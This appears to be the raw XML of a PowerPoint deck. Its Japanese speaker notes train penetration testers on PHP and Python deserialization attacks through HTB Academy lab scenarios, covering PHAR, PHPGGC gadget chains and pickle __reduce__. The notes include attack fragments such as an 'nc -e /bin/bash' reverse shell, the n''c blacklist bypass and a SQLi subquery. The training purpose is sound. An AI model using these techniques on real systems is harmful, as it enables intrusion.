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Lst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId2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notesMaster" Target="notesMasters/notesMaster1.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId3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本勉強会は「デシリアライゼーション攻撃」を扱うセキュリティ実務者向けの社内勉強会です。HTB Academyが提供したPHP/Pythonの教材を土台に、ブラックボックス診断の現場でどう脆弱性を発見し、仮説を立て、安全に検証し、成立性と影響を評価するかに重点を置いて再構成しています。想定時間は60〜90分、対象は中級〜上級のペンテスター・脆弱性診断員です。まず自己紹介とゴール設定から入り、最後にチェックリストと演習で実務への接続を確認し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本資料のゴールは「知識として知っている」で終わらせないことです。既知のペイロードやツールの使い方を暗記するだけでは、見たことのないフレームワークやカスタムコードに出会ったときに対応できません。そこで3つの軸を立てます。(1)知識：なぜそのバイト列が危険なのか、仕組みから理解する。(2)発見：ソースコードが無いブラックボックス診断でも、機能の性質（設定の入出力、セッション、Cookie、APIなど）から「ここは危ないかもしれない」と当たりをつけられるようになる。(3)評価：見つけた兆候が本当に脆弱性として成立するのか、推測で終わらせず、安全な検証計画を立てて事実として積み上げ、影響範囲まで含めて報告できるようになる。最後の評価軸が最も重要で、本資料の後半（診断プロセス・演習・チェックリスト）に多くの時間を割いてい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全体はおよそ6パートです。前半（1〜3）は基礎知識とHTBankのケーススタディで「何が起きているか」を手を動かしながら理解します。後半（4〜6）はRCEへの深掘りとツール、Pythonとの比較、そして最も重要な「ブラックボックス診断での判断力」に焦点を移します。演習A〜D（署名付きCookie、Import機能、Python pickle、ガジェットチェーンの適合性）は別紙の講師用ガイドに収録しており、時間配分に応じてパート3後・パート6後などに差し込んでください。60分バージョンでは演習を1〜2問に絞り、90分バージョンでは4問すべてとディスカッションを行うことを推奨し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シリアライズはメモリ上のオブジェクトをバイト列に変換し、保存やネットワーク送信を可能にする処理、デシリアライズはその逆でバイト列から元のオブジェクトを再構築する処理です。多くのオブジェクト指向言語がネイティブにサポートしており、PHPのserialize/unserialize、Pythonのpickle.dumps/pickle.loadsが代表例です。重要なのは「PHPのシリアライズデータは人間にも比較的読みやすい（a:3:{...}のような構造）」のに対し、「Pythonのpickleは仮想マシン向けのオペコード列であり、人間には読みにくい」という違いです。この違いはブラックボックスでの識別のしやすさに直結します。PHPは文字列パターンで一目で判別できますが、pickleはプロトコルのマジックバイト（例：80 04 95）やBase64のパターンから推測する必要があります。ここは後の「ブラックボックスでの特定」スライドで詳しく扱います。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このデータフローが、デシリアライゼーション攻撃の本質を一枚で表しています。アプリケーションはオブジェクトをシリアライズしてバイト列にし、それをCookie、セッション、隠しフィールド、API応答、ファイルなどに保存・送信します。後でそのバイト列をデシリアライズして元のオブジェクトに戻しますが、このバイト列が「ユーザーが制御可能な場所」に置かれている場合、攻撃者はそれを改ざんしたり、ゼロから自分で生成したりできます。アプリケーション側がデシリアライズ前に検証やフィルタを行わなければ、攻撃者が用意した任意のオブジェクト（またはプロパティ値）がそのままメモリ上に再構築されてしまいます。これがObject InjectionとRCEの共通の起点です。診断の第一歩は「このバイト列らしきものはどこから来て、どこで検証され、どこでデシリアライズされるか」をデータフローとして追うことです。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デシリアライゼーションは2011年ごろから攻撃ベクターとして知られていましたが、本格的に広まったのは2015年のセキュリティ研究者@frohoff氏と@gebl氏による講演と、2016年の"Java Deserialization Apocalypse"、そしてJavaのデシリアライゼーションペイロードを生成するツールysoserialの公開がきっかけです。現在ではOWASP Top 10のA08:2021「Software and Data Integrity Failures」に分類され、言語やフレームワークを問わず毎年多数のCVEが報告されています。重要な誤解の訂正：デシリアライゼーション攻撃は「Javaだけの話」ではありません。PHP、Python、Ruby、.NETなど、オブジェクトのシリアライズ機構を持つ言語であればどこでも成立し得ます。言語ごとにガジェットチェーンの組み立て方や識別方法は異なりますが、「ユーザー制御データを無検証でデシリアライズしない」という根本原則は共通です。この後の内容はPHPとPythonを中心に扱いますが、診断の考え方自体はJavaや.NETの案件にもそのまま応用でき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本モジュールでは主にこの2系統を扱います。Object Injectionは「データの意味を書き換える」攻撃で、必ずしもコード実行には至りませんが、権限昇格やメール検証バイパス、XSSなど単独でも十分に深刻な影響を持ちます。RCEは「デシリアライズをトリガーにコードや関数呼び出しを実行させる」攻撃で、__wakeup()や__destruct()などのマジックメソッド、あるいはベンダーコード内の既存クラス（ガジェット）を連鎖させて到達します。この2つは排他的ではなく、多くの実案件ではまずObject Injectionとして兆候を見つけ、その後RCEやSQLi、LFI、DoSへと影響を広げられるかを評価する、という順序で進みます。重要なのは「見つかった改ざん可能性＝即RCE」ではないという点で、影響の種類は開発者がどのマジック関数をどう実装しているかに依存します。この判断軸は後半の演習Dで深掘りし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ホワイトボックス評価でソースコードにアクセスできる場合は、これらの関数呼び出しをgrepするだけで候補箇所を素早く洗い出せます。ただし関数を見つけただけでは終わりではなく、(1)その入力がどこから来るか（ユーザー制御可能か）、(2)デシリアライズ前にフィルタや型チェックがあるか、(3)対象クラスにマジックメソッドが定義されているか、を必ず追う必要があります。HTBankの例でも、Exportで表示されたメッセージ文字列をgrepすることで該当コントローラーのhandleSettingsIE()にたどり着き、その中のunserialize(base64_decode($request['settings']))という一行を特定しました。ホワイトボックスでの作業の目的は「どこで危険な処理が起きるか」を確定させることであり、次のブラックボックスの話は「ソースコードが無くても同じことをどう推測するか」です。実務では両方を組み合わせる「グレーボックス」診断（部分的なソース開示、フレームワーク推定など）も多いことを補足してくださ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ブラックボックスでは、入出力として観測される値をデコードし、このようなパターンに当てはまるかを確認します。実務での手順はおおよそ次の通りです。(1) 値がBase64やURLエンコードされていればまず素直にデコードする。(2) 結果がこの表のいずれかのパターンに一致するか目視で確認する。(3) 一致したら「シリアライズ形式に見える」という仮説を立てる—ただしこれは確定ではなく仮説であることに注意。自動検出ツールとしては、Java/.NETのシリアライゼーション検出・悪用を支援するBurp Suite拡張Freddyなどがあります。注意点として、Base64っぽい文字列が全てシリアライズデータとは限らず、JWT、暗号化データ、単なるID、圧縮データなども同様の見た目になり得ます。したがって次のステップとして「値を少し変えて送り返したときの挙動の差分」を見ることが重要です（エラーメッセージの変化、500エラー、署名検証エラーなど）。これは次のスライド「ブラックボックス診断の調査プロセス」で扱い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ブラックボックス診断の基本サイクルです。まず入力点を網羅的に洗い出し（STEP1）、それぞれの値をデコードしてシリアライズ形式らしきパターンがあるか確認します（STEP2、前スライドのシグネチャ表を使う）。次に重要なのがSTEP3「正常系の把握」で、改ざん前の挙動を基準として記録しておかないと、STEP4の差分が何を意味するのか判断できません。STEP4では値を少しずつ変化させ（1バイト変更、型を変える、長さを変える、文字列の長さフィールドだけ変える等）、レスポンスの違い（HTTPステータス、エラーメッセージ文言、処理時間、ログイン状態の変化など）を記録します。例えば「値を変えると署名検証エラーになる」という結果は、デシリアライズ自体が起きていないことを示唆する場合もあれば、デシリアライズの前段に署名検証があるだけで後段は無防備という可能性も残します（演習Aで深掘り）。STEP5「無害な検証」は、実際に害のない形（例えば無関係な既知の値に書き換える、ログにのみ残る文字列を注入する等）で成立性を証明してから、初めて影響評価に進むという順序を徹底することを意味します。このサイクルは直線的ではなく、新しい手がかりが出るたびにSTEP1〜2に戻る反復プロセスであることを強調してくださ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HTBank GmbHのシナリオはホワイトボックス評価ですが、進め方自体はブラックボックス診断の思考プロセスをそのまま踏襲しています。まずサイトを一通り探索し、登録・ログイン・設定変更という典型的な機能群を確認します。「@htbank.comドメインでは登録できない」というヒントは、後で目指すべきゴール（管理者ドメインのメールアドレスを獲得できるか）を示唆しています。/settingsページのImport/Export Settings機能に注目すると、Exportボタンを押すだけで長いBase64文字列が表示されます。これをローカルでBase64デコードすると、O:24:"App\Helpers\UserSettings":4:{...}という、PHPのシリアライズされたオブジェクト特有の構造（オブジェクト形式：O:クラス名の長さ:"クラス名":プロパティ数:{...}）が現れます。ここまではブラックボックスでも全く同じ手順で到達できる点を強調してください——Base64らしき値をExportボタンから入手し、デコードし、シグネチャと照合するだけです。ホワイトボックスの利点はこの先、grepでソースコードの該当処理（handleSettingsIE()）を即座に特定できる点にあり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ort/Import機能が危険になりやすい理由を構造的に示した図です。EXPORT側は、アプリケーションが自分の内部状態をシリアライズして「表示する」だけの一方向フローで、基本的には無害です。問題はIMPORT側です。開発者は「どうせ自分がExportした値しかImportされない」という前提を暗黙に置きがちで、その結果、デシリアライズ前の検証（型チェック、署名、許可リストなど）を実装し忘れることが頻繁にあります。HTBankのhandleSettingsIE()でもまさにこのパターンで、$userSettings = unserialize(base64_decode($request['settings']))のあと、何のフィルタも型チェックもなく、$userSettings-&gt;getName()などの戻り値をそのままDBに保存していました。診断時のポイントは「Export機能がある＝Import機能もあるはず」と推測し、両方をセットで確認すること、そして「このインポート処理はアプリが生成した値以外（攻撃者が自作した値）を受け入れてしまわないか」を検証することです。これはCookieのような「暗黙に信頼されがちな入力点」全般に当てはまる考え方で、次のセクションの署名付きCookieの演習にもつながり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この2つの結果は、RCEに至らなくてもObject Injectionだけで実害が出ることを示す重要な例です。1つ目はアプリケーションの登録フォームにある「@htbank.comドメインは禁止」というバリデーションを、Import/Export機能という別経路から完全にバイパスした例です。攻撃者はローカルでUserSettingsクラスの定義をコピーし、任意のEmailを指定したオブジェクトを生成・シリアライズ・Base64エンコードし、Importに貼り付けるだけで、ログイン中ユーザーのメールアドレスを書き換えられました。2つ目は、Importが成功した際のメッセージ"Imported settings for '&lt;name&gt;'"がBladeテンプレートで{!! !!}（エスケープなし出力）を使って表示されていたため、Nameフィールドに&lt;script&gt;タグを仕込むことで反射型XSSが成立した例です。診断報告の観点では、この2つはそれぞれ別の脆弱性として記録すべきです：(1)入力検証の迂回／ビジネスロジックバイパス、(2)反射型XSS（根本原因はテンプレートのエスケープ忘れであり、Object Injectionはあくまで「攻撃者制御文字列をそこに届けるための経路」）。根本原因が異なれば修正方針も異なる点を強調してください——(1)はデシリアライズ後の値にも登録時と同じバリデーションを適用する、(2)は出力時のエスケープを徹底する、という別々の修正が必要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マジックメソッドはPHPで「名前が__で始まる予約された特殊メソッド」で、全部で17種類あります。本資料で重要なのは、デシリアライズ攻撃における「起点（Trigger）」と「伝播（Propagation）」の役割を区別して理解することです。__wakeup()は、まさにunserialize()が呼ばれた直後にPHPが自動的に実行するため、攻撃者が制御するオブジェクトのデシリアライズ直後に何らかの処理を強制実行させられる、最もわかりやすい起点です。HTBankの例では、__wakeup()内でshell_execにユーザー制御のName値を結合していたため、単純なコマンドインジェクションが成立しました。一方__destruct()はオブジェクトが破棄されるとき（スクリプト終了時含む）に自動実行されるため、こちらもよく使われる起点で、実際にPHPGGCのLaravel向けガジェットチェーンの多くが__destructをベクターとしています。__get・__call・__toStringなどは「ある処理をデータ型を問わず呼び出せる」性質を悪用し、別のクラスへ処理を連鎖させる"ガジェット"として機能します（例：SQLiのUserModel.__get()）。重要な誤解の訂正：「マジックメソッドがあれば即RCE」ではなく、その中身が攻撃者制御データを危険な関数（shell_exec, eval, file_put_contentsなど）に渡しているかどうかが本質です。マジックメソッドの存在は「可能性」のシグナルであり、確定情報ではありません。</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ガジェットチェーンの構造をTrigger（起点）・Propagation（伝播）・Sink（最終的な危険処理）の3段階で整理した図です。Triggerはマジックメソッド（主に__wakeup, __destruct, __toString）で、デシリアライズという「自分では制御できないきっかけ」によって自動的に実行されます。Propagationは、そのTriggerから一連の既存クラスのメソッド呼び出しを連鎖させ、最終的に危険な関数にたどり着かせる部分です。重要なのは、攻撃者が新しいコードを書いているわけではなく、フレームワークやライブラリの中に"既に存在する"コードの組み合わせを悪用している点です。これがガジェットチェーンという名前の由来（機械のガジェットを組み合わせるイメージ）です。Sinkはsystem()・exec()・eval()・SQLクエリ構築などの最終的な危険処理です。PHPGGCのようなツールは、主要なPHPフレームワーク（Laravel, Symfony, Monolog等）の各バージョンに対して、このTrigger→Propagation→Sinkの経路を事前に解析・カタログ化しており、フレームワークとバージョンさえ分かれば対応するペイロードを自動生成できます。診断上の重要な論点：ブラックボックスでフレームワークとバージョンを特定できても、依存ライブラリの構成やカスタムコードによる割り込みがあると、公開されているガジェットチェーンがそのまま機能するとは限りません（演習Dで扱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この例はガジェットチェーンを使わない、最も単純な形のRCEです。UserSettingsクラスの__wakeup()は、オブジェクトがデシリアライズされるたびにログを/tmp/htbank.logへ追記する処理を行っており、ログメッセージの一部にthis-&gt;getName()、つまり私たちが完全に制御できるName値を文字列結合しています。これはshell_execへの入力の一部をフィルタなしで制御できる、典型的なOSコマンドインジェクション（CWE-78）です。攻撃者はNameを二重引用符"で始めて元のechoコマンドを閉じ、セミコロンで新しいコマンド（nc -e /bin/bashなど）を追加し、#でコメントアウトして残りの構文エラーを無視させます。攻撃の流れとしては、まずローカルに同じUserSettings.phpとtarget.php（unserializeを呼ぶだけの簡易ハーネス）を用意して安全に検証し、問題なく動作することを確認してから本番環境のImport機能に対して実行します。この「ローカルでまず検証してから本番に投げる」という順序は、診断の安全性と再現性の観点で非常に重要な実務上の習慣です。重要な誤解の訂正：デシリアライズ自体が危険なのではなく、デシリアライズ後にマジックメソッドが行う処理（ここではshell_exec呼び出し）が危険なのです。デシリアライズは「きっかけ」であり、「原因」はその後のコードにあり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BankのRCE（コマンドインジェクション）は分かりやすい例ですが、デシリアライズ脆弱性の影響はRCEに限定されません。例としてSQLインジェクションのケースを見ると、UserModelクラスの__get()はアクセスできないプロパティへのアクセス時に、そのプロパティ名をそのままSQL文に結合しています（$get変数）。UserPropertyクラスの__wakeup()はデシリアライズ時に新しいUserModelを作り、保持しているprop値（＝攻撃者が制御可能）を使ってそのプロパティにアクセスするため、結果的に攻撃者はSELECTのカラム部分を自由に書き換えられ、group_concat(table_name) from information_schema.tables...のようなUNIONを使わないSQLi（カラム位置へのサブクエリ注入）が成立します。同様の考え方で、マジックメソッドがファイルパスを扱っていればLFI、再帰的・巨大なデータ構造を許容していればDoSにつながる可能性があります。重要なのは、診断員としては「どのマジックメソッドが、どんな危険な関数に、どのプロパティ値を渡しているか」を機械的に追跡する癖をつけることです。これは次のPHARデシリアライズの話、そしてPythonのpickleにも共通する普遍的な考え方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ARデシリアライズは、ソースコード上でunserialize()を一度も呼んでいなくても成立し得るという点で、ホワイトボックスのgrep戦略だけでは見逃される典型例です。PHP用語で言うと、PHARはPHPアプリケーション一式をJavaのJARのようにアーカイブする仕組みで、各PHARは「metadata」というプロパティを持てます。このmetadataは任意のシリアライズ可能なPHP変数にでき、PHP 8.0より前のバージョンでは、phar://ラッパーを使ったファイル操作関数（file_exists, file_get_contents, file_put_contentsなど）を呼び出すだけで、PHPが自動的にこのmetadataをデシリアライズしてしまいます。HTBankの例では、(1)プロフィール写真アップロード機能がバックエンドで拡張子やMIMEタイプの検証をしておらず、任意の内容のファイルを.jpgとしてアップロードできる、(2)/imageエンドポイントのgetImage()がfile_exists($request-&gt;query('_'))というコードでクエリパラメータをそのままfile_existsに渡している、という2つの条件が揃っていました。攻撃者はコマンドインジェクションのペイロードをmetadataに仕込んだPHARファイルをプロフィール写真としてアップロードし、/image?_=phar://uploads/&lt;MD5&gt;.jpgにアクセスするだけで、__wakeup()経由のコマンド実行を発生させられます。診断上の教訓：「ファイルアップロード機能」と「アップロードされたファイルパスに対するfile_exists/file_get_contents等の操作」の組み合わせを見たら、拡張子によらずPHARデシリアライズの可能性を疑うべきです。phar.readonly設定やPHPバージョンの確認も合わせて行い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署名付きCookieは、値が改ざんされていないことを保証する仕組みであり、デシリアライズ処理そのものの安全性を保証するものではないという点を、この図で整理しています。多くのフレームワーク（例：Laravelのencryptされたセッション、Djangoのsigned cookiesなど）は、Cookie値にHMACなどの署名を付与し、サーバー側で検証してから中身を使用します。演習Aで扱うシナリオのように「値を変更すると署名検証エラーになる」という観測結果が得られた場合、確定できることは「このエンドポイントの署名検証ロジックは機能している」という一点のみです。確定できないこと、そしてここが重要な誤解の訂正ポイントですが、(1)署名さえ正しければデシリアライズは安全に行われる保証はない、(2)署名鍵が推測可能・デフォルト値のまま・ソースコードに露出している・別の目的（別のCookie）と鍵を使い回しているなどの場合、攻撃者が正しい署名を自分で生成できてしまう可能性がある、(3)同じシリアライズデータを受け取る別のエンドポイントで署名検証が行われていない可能性がある、という点は全く排除できていません。次に調査すべき入力点としては、鍵の強度・管理方法の確認（公開リポジトリへの露出、デフォルト値の使用有無）、同一データを扱う他のエンドポイントの洗い出し、アルゴリズム混同攻撃（alg=noneなど、JWT文脈で特に顕著）の可能性などが挙げられます。これは演習Aでそのまま出題し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PHPGGCはAmbionicsが開発したツールで、「PHP Generic Gadget Chains」の略称です。手動でのガジェットチェーン構築はベンダーコードを読み解く高度な作業が必要ですが、PHPGGCは主要フレームワーク（Laravel, Symfony, CodeIgniter, Monolog等）ごとに既知のチェーンをカタログ化しており、phpggc -l &lt;フレームワーク名&gt;で利用可能なチェーン一覧を、phpggc &lt;チェーン名&gt; &lt;関数&gt; &lt;引数&gt;でペイロードを生成できます。HTBankの例ではLaravelバージョン8.83.25に対応するLaravel/RCE9（Function call型、__destructベクター）を使い、system('nc ...')を呼び出すペイロードを生成しました。PHARGGCはBlackHat US 2018で公開された、PHPGGCのペイロードをPHARアーカイブ形式で出力するフォークで、後にPHPGGC本体にマージされました。-p pharオプションでシリアライズされたペイロードの代わりにPHARファイル全体を生成し、前セクションのfile_exists経由の悪用にそのまま使えます。実務上の注意点として、ツールが生成する汎用ペイロードは対象アプリケーションの実際のクラス構造と完全には一致しないため、副作用として500エラーなどが出ることがあります。また、バージョン範囲が一致していても、実際にそのガジェットチェーンが機能するかはアプリケーションの依存ライブラリの実際のインストール状況次第であり、「バージョンが一致＝成立確実」ではないことを強調してください（演習Dの核心的な論点）。</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Pythonのpickleは、PHPのシリアライズとは根本的に異なる設計思想を持ちます。PHPのa:3:{...}のような文字列表現と異なり、pickleは「Pickle Machine（PM）」と呼ばれる仮想スタックマシンのためのバイトコード列です。PROTO、FRAME、EMPTY_LIST、MEMOIZE、MARK、SHORT_BINUNICODE、BININT1、BINFLOAT、APPENDS、STOPといったオペコードが、スタックへのpush/popとメモ（長期記憶）への保存を組み合わせてオブジェクトを再構築します。人間が目視でオペコード列を読み解くのは困難ですが、ブラックボックスでの識別はプロトコルバージョンごとのマジックバイト（例：プロトコル4は80 04 95で始まり.で終わる）で十分可能です。Python 3.8以降はプロトコル4がデフォルトです。セキュリティ上の最大の注意点は、pickleが__reduce__メソッドを実装したオブジェクトの復元時に、任意の呼び出し可能オブジェクト（関数）とその引数をそのまま実行できる設計になっていることです。PHPのようにクラスにマジックメソッドが定義されているかを確認する手順を経ずとも、os.systemのような標準ライブラリ関数を直接呼び出すペイロードを組み立てられます。これはPython公式ドキュメントでも明確に警告されている事実であり、「信頼できないソースからのデータをpickle.loads()してはならない」という原則の根拠です。診断では、pickleらしきデータを見つけた場合、PHPのように「マジックメソッドを探す」のではなく「そもそもpickle.loads()がどこで、どんな入力に対して呼ばれているか」の特定を優先し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この実例はHTB Academy「Introduction to Deserialization Attacks」内のPythonセクション（HTBooks GmbH &amp; Co KGのシナリオ）に基づいています。先の質疑で「ソースコードがないとPickleの偽造はできないのでは」という疑問が出た際に、このスライドを使って回答できます。核心は、Pickleのバイト列には`module.qualname`（クラスの所属モジュールパスとクラス名）とインスタンスの`__dict__`（属性名と値）がそのまま埋め込まれているという事実で、hexダンプをxxd等で見るだけで`util.auth.Session`というクラスパスと`username`/`role`という属性名が判明します。この情報があれば、実際のクラス定義を一切知らなくても、`__module__`と`__qualname__`を偽装したダミークラスのインスタンスを作り、`__dict__`に`role: "admin"`を仕込むだけで、サーバー側は正規の`Session`オブジェクトとして復元してしまいます（`__init__`のDB照会は完全にバイパスされる）。RCEへの拡張では、`__reduce__`が`(呼び出し可能オブジェクト, 引数タプル)`を返す仕組みを使い、`os.system`を直接呼び出します。対象には`nc`, `subprocess`, `Popen`等の文字列を検出する簡易ブラックリストが実装されていましたが、シェルコマンド中の禁止文字列にシングルクォートを挟む（`n''c`）という古典的な手法で回避されています。重要なのは、いきなりリバースシェルを狙うのではなく、まず`os.system("ping -c 5 検証用IP")`のような無害なコマンドでtcpdumpによる到達確認（STEP5の無害な検証の実例）を行ってから、ブラックリスト回避版に進むという順序を踏んでいる点です。ツールの話として、PHPGGCに相当する網羅的なツールはPython側には存在せず、PEASのような生成ツールも対象のブラックリストの前では無修正では動作しなかった（`subprocess.Popen`から`os.system`への差し替えが必要だった）という教材内の記述も、ツール依存のリスクとして触れておくと良いでしょ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この比較表は、PHPとPythonのデシリアライズ攻撃の「表面的な違い」と「本質的な共通点」を同時に示すためのものです。表面的な違いとして、PHPは人間が目視で読めるテキスト形式のため、ブラックボックスでの識別もRCEに至る調査（マジックメソッドを一つずつ確認する）も相対的に追いやすい一方、Pythonのpickleはバイナリのオペコード列で識別はマジックバイトに頼る必要があります。RCEへの到達経路も異なり、PHPは基本的に「既存クラスのマジックメソッドを連鎖させる」という手間のかかる作業（ガジェットチェーン構築）が必要になることが多いのに対し、Pythonのpickleは__reduce__を実装したクラスを用意すれば、任意の呼び出し可能オブジェクトと引数をそのまま実行でき、極端な例ではos.system("...")を一発で呼べてしまいます。この違いは「Pythonの方がPHPより危険」という単純な話ではなく、「攻撃者にとっての手間の差」であり、両方とも根本的には同じ原則、すなわち「ユーザーが制御できるデータを検証なしにデシリアライズしてはならない」という一点に帰着します。中級〜上級者への強調ポイント：PHPのPHARのように、言語やフレームワークには固有の「隠れたデシリアライズ経路」が存在し得るため、unserialize()やpickle.loads()のgrepだけに頼らず、ドキュメントや既知のCVEから言語・フレームワーク固有の危険パターンを把握しておくことが重要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このサイクルは、本資料全体を貫く「ブラックボックス診断の判断プロセス」をまとめたものです。仮説（Hypothesis）は、観測された値のパターンから「これはシリアライズされたデータかもしれない」「このマジックメソッドが危険かもしれない」といった、まだ証明されていない推測です。検証（Verification）は、その仮説を安全な方法で確かめる計画を立てて実行する段階で、無害な値への書き換え、ログにのみ残る文字列の注入など、実害を出さない形を優先します。観測（Observation）は検証の結果として得られた事実（レスポンスの差分、エラーメッセージ、タイミングなど）を記録する段階です。評価（Evaluation）は、その観測結果が最初の仮説を支持するのか、否定するのか、あるいは別の仮説（例えば署名検証の仕組みが別にあるだけ）を示唆するのかを判断する段階です。報告（Report）は、この一連のプロセスを再現手順・証拠とともにまとめる段階ですが、これで終わりではなく、報告の過程で新たな疑問や確認漏れに気づくことも多く、それが次の仮説の材料になります。このサイクルを明示的に意識することで、「ペイロードを当てずっぽうに試す」診断から、「証拠に基づいて成立性を積み上げる」診断へと質を高めることができます。演習A〜Dはいずれもこのサイクルの一部（特に仮説と検証の立て方）を問う構成になってい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この4点は、実際の診断現場で頻発する判断ミスです。1点目：署名検証エラーが出たからといって「このアプリは安全にデシリアライズを扱っている」と結論づけるのは早計です。署名が改ざん検知の役割しか果たしていない可能性、鍵が脆弱な可能性、他のエンドポイントで検証が省略されている可能性を排除できていません。2点目：Base64のような見た目のデータに飛びつき、全てをシリアライズデータだと決めつけると、見当違いの検証に時間を浪費したり、逆に本当に危険な箇所を見逃したりします。必ずシグネチャとの照合と、値を変更した際の挙動差分という2つの根拠を揃えてから仮説を確定させます。3点目：PHPGGCのようなツールが対応バージョンを示していても、実際のアプリケーションにそのガジェットクラスが実在し、autoloadされる状態にあるとは限りません（演習Dの核心）。バージョン情報は「試す価値がある」ことを示す材料であり、「必ず成功する」ことを示す材料ではありません。4点目：PHARデシリアライズのように、危険な関数を直接呼ばずとも発生する経路があるため、ホワイトボックスであってもgrep一発で「デシリアライズ脆弱性なし」と結論づけるのは危険です。ファイルアップロード機能とファイル操作関数の組み合わせも必ず確認対象に含めるべき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最後に3つの要点を改めて確認します。(1)発見は単に「シリアライズっぽい文字列を見つける」ことではなく、Import/Export/Cookie/Session/API/Uploadといった入力点を網羅的に洗い出し、値を変えたときの挙動差分を体系的に観測することから始まります。(2)成立性の証明は、思いついたペイロードをいきなり本番に投げるのではなく、仮説・検証・観測・評価・報告というサイクルを回しながら、推測（まだ証明されていないこと）と事実（観測によって確認されたこと）を明確に区別して積み上げていきます。(3)影響評価はRCEだけがゴールではなく、Object Injection単体でのビジネスロジックバイパスやXSS、SQLi、LFI、DoSまで含めて評価し、報告書には根本原因（CWEレベルまで）とそれに対応する具体的な修正方針をセットで記載します。本資料はあくまでメインスライドであり、15項目の実務チェックリストとその完了基準、演習A（署名付きCookie）・B（Import機能）・C（Python pickle）・D（ガジェットチェーンの適合性）の設問と講師用解答、想定される質問への回答、よくある技術的誤解とその訂正方法は、別紙の講師用ガイド文書に収録しています。質疑応答の時間を十分に取り、特に「このガジェットチェーンは本当に成立するのか」「このエラーは何を意味するのか」といった判断の分かれ目について、参加者同士でディスカッションすることを推奨し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7F6F2"/>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812800"/>
            <a:ext cx="10566400" cy="438150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr lang="en-US" sz="3000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1555750"/>
            <a:ext cx="10566400" cy="4489450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>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7F6F2"/>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812800"/>
            <a:ext cx="10566400" cy="438150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr lang="en-US" sz="3000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1555750"/>
            <a:ext cx="10566400" cy="4489450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>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2.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2.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image" Target="../media/image-5-7.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-5-8.png"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-5-9.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-5-10.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" 